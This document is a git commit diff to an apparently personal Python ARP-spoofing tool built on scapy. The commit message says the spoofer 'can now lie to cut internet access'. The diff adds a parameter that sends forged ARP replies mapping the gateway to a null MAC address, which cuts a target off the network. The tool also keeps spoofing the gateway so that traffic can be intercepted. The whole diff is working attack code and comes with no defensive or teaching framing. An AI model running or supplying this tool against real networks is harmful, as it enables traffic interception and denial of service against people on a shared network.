209c35d087d5ae605e7090eef0619257e7870851
RobertJohnSoler <rsoler@hawk.iit.edu>
2024-12-12 16:09:04 -0600

    spoofer can now lie to cut internet access

--- main.py
+++ main.py
@@ -2,17 +2,18 @@ from spoofing_services import *
 import time
 
 
-if __name__ == "main":
-    target_ip = "some ip"
-    gateway_ip = "another ip"
-    enableIPRoute()
+# if __name__ == "main":
+target_ip = "something"
+gateway_ip = "something"
+enableIPRoute()
 
-    try:
-        while True:
-            spoof(target_ip, gateway_ip)    # lie to the target saying that we are the gateway
-            spoof(gateway_ip, target_ip)    # lie to the gateway saying that we are the target
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("Restoring the network, please wait...")
-        unspoof(target_ip, gateway_ip)  # tell the target who the gateway really is
-        unspoof(gateway_ip, target_ip)  # tell the gateway who the target really is
+try:
+    while True:
+        # spoof(target_ip, gateway_ip)    # lie to the target saying that we are the gateway
+        spoof(target_ip, gateway_ip, "00:00:00:00:00:00")    # like to the target saying that the gateway's IP is a non-existent one
+        spoof(gateway_ip, target_ip)    # lie to the gateway saying that we are the target
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("Restoring the network, please wait...")
+    unspoof(target_ip, gateway_ip)  # tell the target who the gateway really is
+    unspoof(gateway_ip, target_ip)  # tell the gateway who the target really is
--- spoofing_services.py
+++ spoofing_services.py
@@ -8,6 +8,7 @@ import sys
 def enableIPRoute():
     router = IP_Router()
     router.start()
+    print("IP routing enabled.")
 
 
 def getMac(ip):
@@ -19,11 +20,14 @@ def getMac(ip):
         return ans[0][1].src
     
 
-def spoof(target_ip, spoofed_ip):
+def spoof(target_ip, spoofed_ip, spoofed_mac=None):
     target_mac = getMac(target_ip)
-    spoofed_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, op=2)  # Unless explicitly declared in this function, ARP() will use your MAC address as the default sender MAC address
+    if spoofed_mac is None:
+        spoofed_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, op=2)  # Unless explicitly declared in this function, ARP() will use your MAC address as the default sender MAC address
+    elif spoofed_mac is not None:
+        spoofed_arp = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc=spoofed_mac, op=2)
     send(spoofed_arp, verbose=1)
-    print("Spoofed ARP sent to ", target_ip, ".")
+    print("Spoofed ARP sent to the IP", target_ip, "with MAC", target_mac)
 
 
 def unspoof(target_ip, real_ip):
